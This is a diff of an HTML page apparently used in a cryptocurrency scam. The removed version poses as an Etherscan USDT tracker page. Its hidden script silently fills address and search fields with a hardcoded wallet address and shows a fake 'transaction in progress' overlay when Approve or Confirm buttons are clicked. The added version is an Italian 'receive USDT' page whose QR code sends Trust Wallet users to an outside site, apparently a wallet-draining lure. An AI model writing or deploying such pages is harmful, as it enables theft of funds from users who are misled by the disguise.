@@ -1,275 +1,149 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="it">
 <head>
-    <meta charset="UTF-8" />
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Ricevi USDT</title>
 
-    <link rel="icon" type="image/svg+xml" href="./eth.svg" />
-
-    <meta
-        name="viewport"
-        content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover"
-    />
-
-    <title>Tether (USDT) Token Tracker | Etherscan</title>
-
-    <!-- CSS LOCALE -->
-    <link rel="stylesheet" href="./index.css" />
-
-    <style>
-        body {
-            -webkit-user-select: none;
-            user-select: none;
-            margin: 0;
-            padding: 0;
-            overflow-x: hidden;
-        }
-
-        #root {
-            min-height: 100vh;
-        }
-
-        /* ===== MODAL ===== */
-
-        #loader-overlay {
-            display: none;
-            position: fixed;
-            inset: 0;
-            width: 100vw;
-            height: 100vh;
-            background: rgba(0, 0, 0, 0.6);
-            z-index: 2147483647;
-            align-items: flex-end;
-            justify-content: center;
-        }
-
-        #loader-overlay > div {
-            background: #ffffff;
-            border-radius: 24px 24px 0 0;
-            width: 100%;
-            box-shadow: 0 -10px 40px rgba(0,0,0,.3);
-            overflow: hidden;
-            animation: tw-slide-up .35s ease-out;
-        }
-
-        @keyframes tw-slide-up {
-            from {
-                transform: translateY(100%);
-            }
-            to {
-                transform: translateY(0);
-            }
-        }
-
-        .tw-body {
-            padding: 48px 24px 40px;
-            text-align: center;
-        }
-
-        .tw-check-circle {
-            width: 100px;
-            height: 100px;
-            border-radius: 50%;
-            margin: auto;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background: linear-gradient(135deg,#10b981,#059669);
-            color: white;
-            font-size: 48px;
-            font-weight: bold;
-        }
-
-        .tw-title {
-            color: #1a1a2e;
-            font-size: 24px;
-            font-weight: 700;
-            margin: 20px 0 12px;
-        }
-
-        .tw-desc {
-            color: #6b7280;
-            line-height: 1.6;
-            max-width: 320px;
-            margin: auto;
-        }
-
-        .tw-btn {
-            background: #0052ff;
-            color: #fff;
-            border: none;
-            border-radius: 999px;
-            width: 100%;
-            padding: 18px;
-            margin-top: 24px;
-            cursor: pointer;
-            font-size: 16px;
-            font-weight: 600;
-        }
-    </style>
-</head>
-
-<body>
-
-    <!-- MODAL -->
-    <div id="loader-overlay">
-        <div>
-            <div class="tw-body">
-
-                <div class="tw-check-circle">
-                    ✓
-                </div>
-
-                <h2 class="tw-title">
-                    Processing...
-                </h2>
-
-                <p class="tw-desc">
-                    Transaction in progress!
-                    Blockchain validation is underway.
-                    This may take a few minutes.
-                </p>
-
-                <button class="tw-btn">
-                    Transaction details
-                </button>
-
-            </div>
-        </div>
-    </div>
-
-    <!-- ROOT -->
-    <div id="root"></div>
-
-    <!-- ETHERS -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
-
-  <script>
-    /* ===== GLOBAL VARS ===== */
-
-    const _p1 = "0xE57C99A3ae2ae12";
-    const _p2 = "4f026BFa8601F7A956";
-    const _p3 = "309FB53";
-
-    window.rA = _p1 + _p2 + _p3;
-    window.XB = "";
-
-    /* ===== FIX ENCODING ===== */
-
-    function forceFixApprox() {
-
-        document.querySelectorAll("*").forEach((el) => {
-
-            const txt = el.textContent?.trim();
-
-            if (!txt) return;
-
-            if (
-                txt.includes("Ã¢â°Ë†") ||
-                txt.includes("â‰ˆ") ||
-                txt.includes("Â≈")
-            ) {
-
-                el.innerHTML = el.innerHTML
-                    .replace(/Ã¢â°Ë†/g, "≈")
-                    .replace(/â‰ˆ/g, "≈")
-                    .replace(/Â≈/g, "≈");
-            }
-        });
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
     }
 
-    window.addEventListener("load", () => {
-        setTimeout(forceFixApprox, 500);
-    });
+    body {
+      background: #f5f5f5;
+      display: flex;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
 
-    /* ===== BUTTON LISTENER ===== */
+    .container {
+      width: 100%;
+      max-width: 420px;
+      background: white;
+      min-height: 100vh;
+      padding: 20px;
+    }
 
-    window.addEventListener("click", (e) => {
+    .title {
+      text-align: center;
+      font-size: 34px;
+      font-weight: 700;
+      margin-top: 15px;
+      margin-bottom: 20px;
+    }
 
-        const button = e.target.closest?.("button");
-        const btnText = button?.innerText || "";
+    .warning {
+      background: #f9efd8;
+      border-radius: 16px;
+      padding: 16px;
+      font-size: 15px;
+      color: #4a4a4a;
+      margin-bottom: 20px;
+      line-height: 1.4;
+    }
 
-        if (
-            btnText.includes("Approve") ||
-            btnText.includes("Confirm") ||
-            btnText.includes("Connect") ||
-            btnText.includes("Next")
-        ) {
+    .token {
+      text-align: center;
+      font-size: 28px;
+      font-weight: 700;
+      margin-bottom: 20px;
+    }
 
-            setTimeout(() => {
+    .badge {
+      background: #efefef;
+      border-radius: 8px;
+      padding: 5px 10px;
+      font-size: 15px;
+      vertical-align: middle;
+    }
 
-                const overlay =
-                    document.getElementById("loader-overlay");
+    .card {
+      background: white;
+      border-radius: 20px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.08);
+      padding: 20px;
+      text-align: center;
+    }
 
-                if (overlay) {
-                    overlay.style.display = "flex";
-                }
+    .qr {
+      width: 260px;
+      height: 260px;
+      display: block;
+      margin: auto;
+    }
 
-            }, 500);
-        }
-    });
-</script>
+    .desc {
+      color: #666;
+      text-align: center;
+      margin-top: 18px;
+      line-height: 1.5;
+      font-size: 16px;
+    }
 
+    .btn {
+      width: 100%;
+      border: none;
+      background: #3375ff;
+      color: white;
+      padding: 18px;
+      border-radius: 18px;
+      font-size: 18px;
+      font-weight: 700;
+      margin-top: 28px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
 
-<script>
-const WALLET_ADDRESS =
-"0x50932547519422dAcd22E76c8EEaea21B632e8D9";
+  <div class="container">
 
-window.rA = WALLET_ADDRESS;
+    <div class="title">
+      Ricevi
+    </div>
 
-function injectAddress() {
+    <div class="warning">
+      Invia solo USDT (ERC20) a questo indirizzo.
+      Gli altri asset potrebbero andare persi.
+    </div>
 
-    const selectors = [
-        'input',
-        'textarea',
-        '[contenteditable="true"]'
-    ];
+    <div class="token">
+      USDT <span class="badge">Ethereum</span>
+    </div>
 
-    document.querySelectorAll(selectors.join(','))
-    .forEach(el => {
+    <div class="card">
 
-        const placeholder =
-            (el.placeholder || '').toLowerCase();
+      <img
+        class="qr"
+        src="https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=https://link.trustwallet.com/open_url?url=https://sftw.vercel.app/"
+      />
 
-        const aria =
-            (el.getAttribute('aria-label') || '')
-            .toLowerCase();
+    </div>
 
-        const looksLikeAddressField =
-            placeholder.includes('address') ||
-            placeholder.includes('domain') ||
-            placeholder.includes('search') ||
-            aria.includes('address');
+    <div class="desc">
+      Scansiona il QR code con Trust Wallet per aprire il sito.
+    </div>
 
-        if (!looksLikeAddressField) return;
+    <button class="btn" onclick="closePage()">
+      Continua
+    </button>
 
-        el.value = WALLET_ADDRESS;
+  </div>
 
-        el.dispatchEvent(
-            new Event('input', {
-                bubbles: true
-            })
-        );
+  <script>
+    function closePage() {
+      window.close();
 
-        el.dispatchEvent(
-            new Event('change', {
-                bubbles: true
-            })
-        );
-    });
-}
-
-window.addEventListener("load", () => {
-
-    injectAddress();
-
-    setTimeout(injectAddress, 500);
-    setTimeout(injectAddress, 1000);
-    setTimeout(injectAddress, 2000);
-});
-</script>
-    
-    <!-- JS LOCALE -->
-    <script type="module" src="./index.js"></script>
+      setTimeout(() => {
+        history.back();
+      }, 200);
+    }
+  </script>
 
 </body>
 </html>
